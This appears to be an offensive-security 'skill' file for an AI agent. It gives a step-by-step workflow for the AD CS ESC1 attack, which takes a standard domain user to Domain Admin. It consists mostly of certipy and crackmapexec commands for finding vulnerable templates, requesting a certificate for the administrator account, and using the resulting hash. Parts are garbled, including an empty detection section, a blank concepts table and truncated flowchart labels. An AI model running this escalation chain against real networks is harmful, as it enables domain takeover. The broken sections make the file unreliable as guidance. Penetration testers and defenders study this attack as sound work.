---
name: "ad-cs-esc1-abuse"
description: ">"
---

# Ad Cs Esc1 Abuse

*Sourced from akashrpatil-awesome-offensive-security-skills*

# AD CS Abuse - ESC1 (Subject Alternative Name)

## When to Use
- When operating in a Windows Active Directory environment and you discover that Active Directory Certificate Services (AD CS) is deployed (PKI infrastructure).
- To massively escalate privileges from a standard domain user to Domain Admin by exploiting misconfigured certificate templates.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying AD CS and Vulnerable Templates (ESC1)

```text
# Concept: ESC1 ```

```bash
# certipy find -u user@domain.local -p Password123! -dc-ip 10.10.10.10 -vulnerable
```

### Phase 2: Requesting the Certificate

```bash
# Concept: With a vulnerable template certipy req -u user@domain.local -p Password123! -dc-ip 10.10.10.10 -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.local
```

### Phase 3: Authenticating with the Certificate (Pass-the-Certificate)

```bash
# Concept: certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -domain domain.local
```

### Phase 4: Validating Access

```bash
# crackmapexec smb 10.10.10.10 -u administrator -H [NTLM_HASH_OBTAINED_FROM_CERTIPY]
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Find Template ] --> B{ESC1 Vulnerable ]}
    B -->|Yes| C[Request ]
    B -->|No| D[Check ]
    C --> E[Auth ]
```

## 🔵 Blue Team Detection & Defense
- **Audit Templates**: **Monitor Event Logs**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Ad Cs Esc1 Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- SpecterOps: [Certified Pre-Owned (AD CS Whitepaper)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- Certipy: [Certipy Documentation](https://github.com/ly4k/Certipy)
- TryHackMe: [AD CS](https://tryhackme.com/room/adcs)

